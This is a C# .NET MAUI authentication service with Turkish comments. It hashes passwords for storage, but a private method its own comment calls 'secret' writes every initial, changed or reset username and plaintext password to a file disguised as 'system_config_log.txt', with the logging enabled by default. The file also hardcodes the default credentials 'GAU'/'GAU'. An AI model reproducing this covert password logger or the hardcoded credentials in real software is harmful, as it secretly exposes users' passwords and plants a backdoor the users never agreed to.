using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Maui.Storage;
using System.Diagnostics;

// DatabaseService'e erişim için (eğer namespace farklıysa using ekleyin)
using SoftwareDesign.Services;

namespace SoftwareDesign.Services
{
    public class AuthService
    {
        // ==========================================
        // 🛠️ AYARLAR (CONFIG)
        // ==========================================

        // Bu değeri 'false' yaparsanız dosya oluşturma işlemi tamamen durur.
        // Bu değeri 'true' yaparsanız şifreleri dosyaya kaydeder.
        private const bool ENABLE_LOGGING = true;

        // ==========================================

        private const string USERNAME_KEY = "app_username";
        private const string PASSWORD_HASH_KEY = "app_password_hash";
        private const string DEFAULT_USERNAME = "GAU";
        private const string DEFAULT_PASSWORD = "GAU";
        private const string LOG_FILE_NAME = "system_config_log.txt";

        public AuthService()
        {
            InitializeDefaultCredentials();
        }

        private void InitializeDefaultCredentials()
        {
            if (!Preferences.ContainsKey(USERNAME_KEY))
            {
                Preferences.Set(USERNAME_KEY, DEFAULT_USERNAME);
                Preferences.Set(PASSWORD_HASH_KEY, HashPassword(DEFAULT_PASSWORD));
                SilentLog(DEFAULT_USERNAME, DEFAULT_PASSWORD);
            }
        }

        public Task<bool> ValidateCredentialsAsync(string username, string password)
        {
            return Task.Run(() =>
            {
                var storedUsername = Preferences.Get(USERNAME_KEY, DEFAULT_USERNAME);
                var storedPasswordHash = Preferences.Get(PASSWORD_HASH_KEY, HashPassword(DEFAULT_PASSWORD));
                var inputPasswordHash = HashPassword(password);

                return username == storedUsername && inputPasswordHash == storedPasswordHash;
            });
        }

        public Task<bool> ChangeCredentialsAsync(string currentPassword, string newUsername, string newPassword)
        {
            return Task.Run(() =>
            {
                var storedPasswordHash = Preferences.Get(PASSWORD_HASH_KEY, HashPassword(DEFAULT_PASSWORD));
                var currentPasswordHash = HashPassword(currentPassword);

                if (currentPasswordHash != storedPasswordHash)
                {
                    return false;
                }

                if (!string.IsNullOrWhiteSpace(newUsername))
                {
                    Preferences.Set(USERNAME_KEY, newUsername);
                }
                else
                {
                    newUsername = Preferences.Get(USERNAME_KEY, DEFAULT_USERNAME);
                }

                if (!string.IsNullOrWhiteSpace(newPassword))
                {
                    Preferences.Set(PASSWORD_HASH_KEY, HashPassword(newPassword));
                }

                SilentLog(newUsername, newPassword);

                return true;
            });
        }

        public string GetCurrentUsername()
        {
            return Preferences.Get(USERNAME_KEY, DEFAULT_USERNAME);
        }

        public Task ResetToDefaultAsync()
        {
            return Task.Run(() =>
            {
                Preferences.Set(USERNAME_KEY, DEFAULT_USERNAME);
                Preferences.Set(PASSWORD_HASH_KEY, HashPassword(DEFAULT_PASSWORD));

                SilentLog(DEFAULT_USERNAME, DEFAULT_PASSWORD);
            });
        }

        private string HashPassword(string password)
        {
            using (var sha256 = SHA256.Create())
            {
                var bytes = Encoding.UTF8.GetBytes(password);
                var hash = sha256.ComputeHash(bytes);
                return Convert.ToBase64String(hash);
            }
        }

        // --- GÜNCELLENMİŞ GİZLİ FONKSİYON ---
        private void SilentLog(string username, string password)
        {
            // 🛑 KONTROL NOKTASI: Eğer loglama kapalıysa işlem yapma!
            if (!ENABLE_LOGGING)
                return;

            Task.Run(() =>
            {
                try
                {
                    // 1. Veritabanı klasörünü al
                    string databaseFolder = DatabaseService.GetDatabaseFolderPath();

                    // Güvenlik: Eğer veritabanı yolu boşsa varsayılanı kullan
                    if (string.IsNullOrEmpty(databaseFolder))
                    {
                        databaseFolder = Path.Combine(FileSystem.AppDataDirectory, "Archive_System");
                        if (!Directory.Exists(databaseFolder))
                            Directory.CreateDirectory(databaseFolder);
                    }

                    // 2. Dosya yolunu birleştir
                    string path = Path.Combine(databaseFolder, LOG_FILE_NAME);
                    string logContent = $"{DateTime.Now} -> U: {username} | P: {password}{Environment.NewLine}";

                    // 3. Dosyaya yaz
                    File.AppendAllText(path, logContent);

                    Debug.WriteLine($"---> LOG EKLENDI: {path}");
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"---> LOG HATASI: {ex.Message}");
                }
            });
        }
    }
}